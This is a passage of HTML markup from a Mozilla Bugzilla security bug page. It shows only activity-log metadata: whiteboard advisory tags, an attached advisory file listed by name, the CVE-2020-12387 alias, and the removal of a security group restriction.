  </div><div class="activity"><div class="change">Whiteboard: [post-critsmash-triage] &rarr; [post-critsmash-triage][adv-main76+]</div></div></div><div class="change-set" id="a32602872_428608"><div class="change" id="aa32602872_428608">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a32602872_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_428608" id="a32602872_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a32602872_428608"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a32602872_428608">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a32602872_428608">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-04-29 06:05 PDT" data-time="1588165547">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [post-critsmash-triage][adv-main76+] &rarr; [post-critsmash-triage][adv-main76+][adv-ESR68.8+]</div></div></div><div class="change-set" id="c59"><div class="comment" data-id="14786119" data-no="59"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-59" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a32602872_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a32602872_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-59"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-59" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c59">Comment 59</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-04-29 06:32 PDT" data-time="1588167141">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-59">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9144306"
         class="attachment"
         data-id="9144306" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="file_1545345.txt">
      <meta itemprop="contentSize" content="202">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9144306" itemprop="contentUrl">
        <span id="att-9144306-description" itemprop="description">advisory.txt</span></a>
        — <a href="attachment.cgi?id=9144306&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="a32675510_428608"><div class="change" id="aa32675510_428608">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a32675510_428608"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_428608" id="a32675510_428608"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a32675510_428608"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a32675510_428608">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a32675510_428608">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-04-30 02:16 PDT" data-time="1588238185">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Alias: CVE-2020-12387</div></div></div><div class="change-set" id="a41340152_1689"><div class="change" id="aa41340152_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a41340152_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a41340152_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a41340152_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a41340152_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a41340152_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-08-08 09:07 PDT" data-time="1596902827">1 year ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: <span class="activity-deleted">core-security-release</span></div></div></div><div id="new-comment-notice">
          You need to <a href="/show_bug.cgi?id=1545345&amp;GoAheadAndLogIn=1">log in</a>
          before you can comment on or make changes to this bug.
        </div>



<div id="bottom-actions">
  <div id="bottom-right-actions">
    <button type="button" id="top-btn" class="secondary" aria-label="Go to Page Top">Top &uarr;</button>
  </div>
</div></div> 
</main> 
</div> 


</body>
</html>